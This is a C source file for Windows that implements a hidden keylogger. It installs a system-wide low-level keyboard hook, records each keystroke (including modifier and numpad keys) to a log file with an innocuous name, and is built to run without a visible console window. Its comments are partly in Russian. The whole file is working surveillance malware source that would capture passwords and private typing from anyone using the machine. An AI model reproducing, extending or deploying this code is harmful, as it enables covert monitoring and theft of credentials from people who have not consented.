#include <stdio.h>
#include <windows.h>
#include <wininet.h>
//-------------------------------------------

int shiftwasprev=0;
int ctrlwasprev=0;
HFILE f;
HHOOK hKeyHook;
KBDLLHOOKSTRUCT kbdStruct;

void append(HFILE f1) // перемешает указатель в конец  файла
{
	WIN32_FIND_DATA fData;
	HANDLE h = FindFirstFile("ctmctr.txt", &fData);
    _llseek(f1,fData.nFileSizeLow,0);
}

LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	if( (nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP)) )
	{
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		char s[10];
		char c;
		c=(unsigned char)kbdStruct.vkCode;
		if ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))
		{
		if (c==32||c>=48&&c<=57||c>=65&&c<=91)
		{
			s[0]=c;
			_lwrite(f,s,1);
		}
		else if (c==-64)
		{
			s[0]='`';
			_lwrite(f,s,1);
		}
		else if (c==20)
		{
			s[0]='[';
			s[1]='C';
			s[2]='P';
			s[3]='S';
			s[4]=']';
			_lwrite(f,s,5);
		}
		else if (c==-92||c==-91)
		{
			s[0]='[';
			s[1]='A';
			s[2]='L';
			s[3]='T';
			s[4]=']';
			_lwrite(f,s,5);
		}
		else if (c==-36)
		{
			s[0]='\\';
			_lwrite(f,s,1);
		}
		else if (c==-67)
		{
			s[0]='-';
			_lwrite(f,s,1);
		}
		else if (c==-69)
		{
			s[0]='=';
			_lwrite(f,s,1);
		}
		else if (c==-37)
		{
			s[0]='[';
			_lwrite(f,s,1);
		}
		else if (c==-35)
		{
			s[0]=']';
			_lwrite(f,s,1);
		}
		else if (c==-70)
		{
			s[0]=';';
			_lwrite(f,s,1);
		}
		else if (c==-34)
		{
			s[0]='\'';
			_lwrite(f,s,1);
		}
		else if (c==-68)
		{
			s[0]=',';
			_lwrite(f,s,1);
		}
		else if (c==-66)
		{
			s[0]='.';
			_lwrite(f,s,1);
		}
		else if (c==-65)
		{
			s[0]='/';
			_lwrite(f,s,1);
		}
		else if (c==13)
		{
			s[0]='[';
			s[1]='E';
			s[2]='N';
			s[3]='T';
			s[4]='R';
			s[5]=']';
			_lwrite(f,s,6);
		}
		else if (c==111)
		{
			s[0]='[';
			s[1]='N';
			s[2]='/';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==106)
		{
			s[0]='[';
			s[1]='N';
			s[2]='*';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==109)
		{
			s[0]='[';
			s[1]='N';
			s[2]='-';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==107)
		{
			s[0]='[';
			s[1]='N';
			s[2]='+';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==110)
		{
			s[0]='[';
			s[1]='N';
			s[2]='.';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==96)
		{
			s[0]='[';
			s[1]='N';
			s[2]='0';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==97)
		{
			s[0]='[';
			s[1]='N';
			s[2]='1';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==98)
		{
			s[0]='[';
			s[1]='N';
			s[2]='2';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==99)
		{
			s[0]='[';
			s[1]='N';
			s[2]='3';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==100)
		{
			s[0]='[';
			s[1]='N';
			s[2]='4';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==101)
		{
			s[0]='[';
			s[1]='N';
			s[2]='5';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==102)
		{
			s[0]='[';
			s[1]='N';
			s[2]='6';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==103)
		{
			s[0]='[';
			s[1]='N';
			s[2]='7';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==104)
		{
			s[0]='[';
			s[1]='N';
			s[2]='8';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==105)
		{
			s[0]='[';
			s[1]='N';
			s[2]='9';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==8)
		{
			s[0]='[';
			s[1]='B';
			s[2]='S';
			s[3]=']';
			_lwrite(f,s,4);
		}
		else if (c==46)
		{
			s[0]='[';
			s[1]='D';
			s[2]='E';
			s[3]='L';
			s[4]=']';
			_lwrite(f,s,5);
		}
		else if (c==-95||c==-96)
		{
			s[0]='[';
			s[1]='S';
			s[2]='F';
			s[3]='D';
			s[4]='W';
			s[5]=']';
			if (!shiftwasprev)
				_lwrite(f,s,6);
			shiftwasprev=1;
		}
		else if (c==-93||c==-94)
		{
			s[0]='[';
			s[1]='C';
			s[2]='L';
			s[3]='D';
			s[4]='W';
			s[5]=']';
			if (!ctrlwasprev)
				_lwrite(f,s,6);
			ctrlwasprev=1;
		}
		}
		if ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))
		{
		if (c==-95||c==-96)
		{
			s[0]='[';
			s[1]='S';
			s[2]='F';
			s[3]='U';
			s[4]='P';
			s[5]=']';
			_lwrite(f,s,6);
		}
		else if (c==-93||c==-94)
		{
			s[0]='[';
			s[1]='C';
			s[2]='L';
			s[3]='U';
			s[4]='P';
			s[5]=']';
			_lwrite(f,s,6);
		}
		}
		if (c!=-95&&c!=-96)
			shiftwasprev=0;
		if (c!=-93&&c!=-94)
			ctrlwasprev=0;
	}

	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

//gcc -mwindows gsrvctr.c -o gsrvctr.exe
//gcc -mwindows gsrvctr.c -o gsrvctr.exe
//-mwindows tells compiler that it's gonna be a GUI application and no fckn console will pop
//gcc -mwindows gsrvctr.c -o gsrvctr.exe
//gcc -mwindows gsrvctr.c -o gsrvctr.exe

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,int nCmdShow)
{

	//---------------------------------------------------------- открываем лог для записи. если не существует то создаем
    f=_lopen("ctmctr.txt",1);
	if(f==-1) f=_lcreat("ctmctr.txt",0); else append(f);
	
	char s1[10];
	s1[0]='\n';
	s1[1]='[';
	s1[2]='S';
	s1[3]='T';
	s1[4]='A';
	s1[5]='R';
	s1[6]='T';
	s1[7]=']';
	_lwrite(f,s1,8);
	
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);

	MSG message;
	while(GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(hKeyHook);
	_lclose(f);
	return 0;
}